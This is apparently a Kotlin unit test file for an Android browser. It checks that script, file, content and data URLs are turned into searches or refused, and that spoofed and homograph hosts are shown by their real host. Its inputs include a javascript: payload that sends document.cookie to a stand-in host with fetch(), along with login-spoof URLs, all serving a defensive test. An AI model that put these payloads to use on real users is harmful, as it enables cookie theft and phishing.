package com.slate.browser

import com.slate.browser.data.SearchEngine
import com.slate.browser.util.UrlUtils
import com.slate.browser.web.UrlSafety
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/**
 * What the browser will and will not treat as an address.
 *
 * Every URL here is hostile input: typed by a user who was told to paste it, handed over by
 * another app, or written by a page. The tests are the attacks, not the happy path.
 */
@RunWith(RobolectricTestRunner::class)
class UrlSafetyTest {

    private fun typed(input: String) = UrlUtils.toLoadableUrl(input, SearchEngine.DUCKDUCKGO)

    @Test
    fun `a javascript URL is never navigated to, however it is written`() {
        // Pasting one of these runs it against whatever page is already open — the user's own
        // signed-in session. It has to become a search, not a navigation.
        listOf(
            "javascript:alert(document.cookie)",
            "JavaScript:alert(1)",
            "  javascript:fetch('https://evil.test?c='+document.cookie)  ",
            "jAvAsCrIpT:void(0)",
        ).forEach { input ->
            val result = typed(input)
            assertFalse("$input was navigated to", result.startsWith("javascript", ignoreCase = true))
            assertTrue("$input must become a search", result.startsWith("https://duckduckgo.com/"))
        }
    }

    @Test
    fun `whitespace inside a scheme does not smuggle it past the check`() {
        // URL parsers strip tabs and newlines before they parse, so a scheme split across one
        // is still that scheme by the time it reaches the engine. Anything that compares the
        // raw text is comparing something the engine will never see.
        listOf(
            "java\nscript:alert(1)",
            "java\tscript:alert(document.cookie)",
            "  java\r\nscript:alert(1)",
            "jav\u0000ascript:alert(1)",
            "fi\nle:///etc/hosts",
        ).forEach { input ->
            val result = typed(input)
            assertTrue(
                "$input was navigated to as ${'$'}result",
                result.startsWith("https://duckduckgo.com/"),
            )
        }
    }

    @Test
    fun `data and file and content URLs are not addresses either`() {
        listOf(
            "data:text/html,<h1>Your bank</h1>",
            "file:///data/data/com.slate.browser/databases/slate.db",
            "content://com.android.contacts/contacts",
            "blob:https://example.com/1234",
            "filesystem:https://example.com/temporary/x",
        ).forEach { input ->
            assertFalse("$input is navigable", UrlSafety.isNavigable(input))
            assertTrue("$input must become a search", typed(input).startsWith("https://duckduckgo.com/"))
        }
    }

    @Test
    fun `ordinary browsing is untouched`() {
        assertEquals("https://example.com/path?q=1", typed("https://example.com/path?q=1"))
        assertEquals("http://example.com", typed("http://example.com"))
        assertEquals("https://example.com", typed("example.com"))
        assertEquals("about:blank", typed("about:blank"))
        assertTrue(typed("how tall is everest").startsWith("https://duckduckgo.com/"))
    }

    @Test
    fun `an address bar shows the host that will actually be reached`() {
        // The oldest spoof there is: the eye stops at the first familiar name it sees.
        assertEquals("evil.test", UrlUtils.displayHost("https://accounts.google.com@evil.test/signin"))
        assertEquals("evil.test", UrlUtils.displayHost("https://www.paypal.com:pass@evil.test/"))
        assertEquals("example.com", UrlUtils.displayHost("https://www.example.com/a/b"))
    }

    @Test
    fun `a host that mixes writing systems is shown in its encoded form`() {
        // "аpple.com" with a Cyrillic а is pixel-identical to the real thing.
        val cyrillic = "аpple.com"
        assertEquals("xn--pple-43d.com", UrlSafety.displayHost(cyrillic))

        // A host written entirely in one script is not impersonating anything, so it reads
        // as itself.
        assertEquals("例え.テスト", UrlSafety.displayHost("xn--r8jz45g.xn--zckzah"))
        assertEquals("example.com", UrlSafety.displayHost("example.com"))
    }

    @Test
    fun `only the web may be handed in from another application`() {
        assertTrue(UrlSafety.isSafeExternalEntry("https://example.com/"))
        assertTrue(UrlSafety.isSafeExternalEntry("http://example.com/"))
        listOf(
            "javascript:alert(1)",
            "file:///sdcard/",
            "content://media/external/images/media/1",
            "intent://evil#Intent;scheme=https;end",
            "https://",
            "",
        ).forEach { assertFalse("$it must not be accepted from outside", UrlSafety.isSafeExternalEntry(it)) }
    }

    @Test
    fun `only an app scheme may leave the browser`() {
        assertTrue(UrlSafety.mayLeaveTheBrowser("myapp://open/thing"))
        assertTrue(UrlSafety.mayLeaveTheBrowser("tel:+441234567890"))
        listOf(
            // Handing these out leaks the browser's own storage or loops the user back here.
            "file:///data/data/com.slate.browser/databases/slate.db",
            "content://com.slate.browser/history",
            "javascript:alert(1)",
            "https://example.com/",
            "http://example.com/",
        ).forEach { assertFalse("$it must not be handed to another app", UrlSafety.mayLeaveTheBrowser(it)) }
    }
}
